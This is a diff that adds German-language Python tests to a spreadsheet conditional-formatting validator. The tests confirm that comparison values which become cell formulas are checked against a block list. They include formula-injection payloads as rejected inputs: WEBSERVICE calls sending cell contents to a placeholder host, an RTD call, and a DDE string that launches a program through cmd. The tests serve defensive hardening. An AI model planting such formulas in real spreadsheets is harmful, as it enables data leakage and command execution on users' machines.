@@ -245,6 +245,24 @@ s, g = pruefe({"typ": "bedingt", "regel": "zellwert", "operator": "groesser",
                "wert": 5, "farbe": "#ffc7ce"})
 check("Farbe wird auf Grossbuchstaben normiert", s and s["farbe"] == "#FFC7CE")
 
+# ⚠ Code-Review 2026-09-28: der Vergleichswert wird im Fenster zur FORMEL
+# (`'=' + wert`) - und lief an der Sperrliste vorbei, die fuer jede
+# Zellformel gilt. Positivkontrolle zuerst: gewoehnliche Werte bleiben gueltig.
+for gut_w in (100, "100", "$B$1", "A1*2", "MITTELWERT(B:B)", "\"Offen\""):
+    s, g = pruefe({"typ": "bedingt", "regel": "zellwert", "operator": "groesser",
+                   "wert": gut_w})
+    check("Vergleichswert %r bleibt gueltig" % (gut_w,), s is not None and not g)
+for boes_w, was in [('WEBSERVICE("https://x.invalid/?"&A1)', "Netzabruf"),
+                    ('_xlfn.WEBSERVICE("https://x.invalid")', "mit _xlfn-Praefix"),
+                    ('RTD("prog.id",,"x")', "RTD"),
+                    ("cmd|'/c calc'!A1", "DDE")]:
+    s, g = pruefe({"typ": "bedingt", "regel": "zellwert", "operator": "groesser",
+                   "wert": boes_w})
+    check("⚠ wert %s wird abgelehnt" % was, s is None and "wert" in (g or ""))
+    s, g = pruefe({"typ": "bedingt", "regel": "zellwert", "operator": "zwischen",
+                   "wert": 1, "wert2": boes_w})
+    check("⚠ wert2 %s wird abgelehnt" % was, s is None and "wert2" in (g or ""))
+
 print("── 7. Quellbereich ─────────────────────────────────────────────────")
 for gut_b in ["Daten!A1:E200", "A1:E200", "'Q1 2026'!A1:C9", "Tabelle1!B7"]:
     check("Bereich %r ist gueltig" % gut_b, o.bereich_pruefen(gut_b) == "")
